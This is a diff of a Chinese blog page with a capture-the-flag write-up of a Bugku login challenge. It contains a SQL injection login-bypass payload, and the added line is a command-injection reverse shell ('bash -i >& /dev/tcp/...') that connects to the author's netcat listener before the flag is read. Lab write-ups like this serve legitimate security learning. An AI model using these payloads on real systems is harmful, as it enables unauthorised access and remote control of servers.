@@ -91,7 +91,7 @@
 <meta property="og:image" content="http://yoursite.com/ctf/bugku3.png">
 <meta property="og:image" content="http://yoursite.com/ctf/bugku4.png">
 <meta property="og:image" content="http://yoursite.com/ctf/bugku5.png">
-<meta property="og:updated_time" content="2018-04-27T11:42:02.457Z">
+<meta property="og:updated_time" content="2018-04-27T11:45:02.411Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku一道题目的学习">
 <meta name="twitter:description" content="题目链接http://118.89.219.210:49165/ 题解 首先进入题是一个登陆界面试了试普通的注入，没什么反应。。然后抓了包，看到头信息里有一段base64加密后的tip。解密后123$sql=&amp;quot;SELECT username,password FROM admin WHERE username=&amp;apos;&amp;quot;.$username.&amp;quot;&amp;apos;&amp;quo">
@@ -363,7 +363,7 @@
 <li>首先进入题是一个登陆界面<img src="/ctf/bugku1.png" alt="bugku">试了试普通的注入，没什么反应。。然后抓了包，看到头信息里有一段base64加密后的tip。解密后<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>看了wp，用的是猜测的登陆机制。。<br>post构造<code>username=&#39; union select md5(1),md5(1)#&amp;password=1</code><br>进入了一个这样的界面<img src="/ctf/bugku2.png" alt="bugku"><br>然后接下来的就是一个反弹shell的操作了。。学习了一波<br>首先在自己的服务器上用nc命令，打开对8080端口的监听<br><img src="/ctf/bugku3.png" alt="bugku"><br>我这里在我的vps上打开了8080端口的监听。可以看到bash处，已经可以开始输入命令了，接着我们查看当前目录下有那些文件<br><img src="/ctf/bugku4.png" alt="bugku"><br>用ls命令进行查看。可以看到一个flag的文件，然后直接用cat命令<br><img src="/ctf/bugku5.png" alt="bugku"><br>得到flag~</p>
+<p>看了wp，用的是猜测的登陆机制。。<br>post构造<code>username=&#39; union select md5(1),md5(1)#&amp;password=1</code><br>进入了一个这样的界面<img src="/ctf/bugku2.png" alt="bugku"><br>然后接下来的就是一个反弹shell的操作了。。学习了一波<br>首先在自己的服务器上用nc命令，打开对8080端口的监听<br><img src="/ctf/bugku3.png" alt="bugku"><br>接下来，在网站中输入 <code>|bash -i &gt;&amp; /dev/tcp/your ip/8080 0&gt;&amp;1</code><br>我这里在我的vps上打开了8080端口的监听。可以看到bash处，已经可以开始输入命令了，接着我们查看当前目录下有那些文件<br><img src="/ctf/bugku4.png" alt="bugku"><br>用ls命令进行查看。可以看到一个flag的文件，然后直接用cat命令<br><img src="/ctf/bugku5.png" alt="bugku"><br>得到flag~</p>
 
       
     </div>
